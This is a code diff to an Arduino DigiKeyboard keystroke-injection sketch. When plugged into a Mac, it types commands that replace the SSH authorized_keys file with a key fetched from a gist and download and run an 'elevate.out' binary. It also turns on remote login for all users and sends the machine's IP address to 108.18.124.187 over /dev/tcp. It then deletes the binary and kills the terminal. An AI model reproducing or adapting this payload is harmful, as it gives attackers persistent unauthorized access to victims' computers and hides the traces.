@@ -24,11 +24,6 @@ void setup() {
     DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
     DigiKeyboard.delay(50);
     // Type out commands letter by letter (assumes US-style keyboard)
-    DigiKeyboard.println("mkdir -p ~/.ssh");
-    DigiKeyboard.delay(50);
-    DigiKeyboard.println("mv ~/.ssh/authorized_keys ~/.ssh/authorized_keys_old");
-    DigiKeyboard.delay(50);
-    DigiKeyboard.println("curl https://gist.githubusercontent.com/ErikBoesen/3d24a2bda89f932e4c1a93a622b53704/raw --output ~/.ssh/authorized_keys");
     DigiKeyboard.delay(5000);
     DigiKeyboard.println("curl -O https://erikboesen.com/downloads/elevate.out");
     DigiKeyboard.delay(5000);
@@ -41,8 +36,18 @@ void setup() {
     // Open ssh service, accessible for all users
     DigiKeyboard.println("dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled");
     DigiKeyboard.println("sudo systemsetup -setremotelogin on");
+    DigiKeyboard.println("mkdir -p ~/.ssh");
+    DigiKeyboard.delay(50);
+    DigiKeyboard.println("mv ~/.ssh/authorized_keys ~/.ssh/authorized_keys_old");
+    DigiKeyboard.delay(50);
+    DigiKeyboard.println("curl https://gist.githubusercontent.com/ErikBoesen/3d24a2bda89f932e4c1a93a622b53704/raw --output ~/.ssh/authorized_keys");
     DigiKeyboard.delay(50);
     DigiKeyboard.println("exit");
+    DigiKeyboard.println("IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`");
+    DigiKeyboard.println("exec 3<>/dev/tcp/108.18.124.187/2043");
+    DigiKeyboard.println("echo \"${IP}\" >&3");
+    DigiKeyboard.println("cat <&3");
+
     DigiKeyboard.println("rm elevate.out && killall term");
 
     // Turn off LED
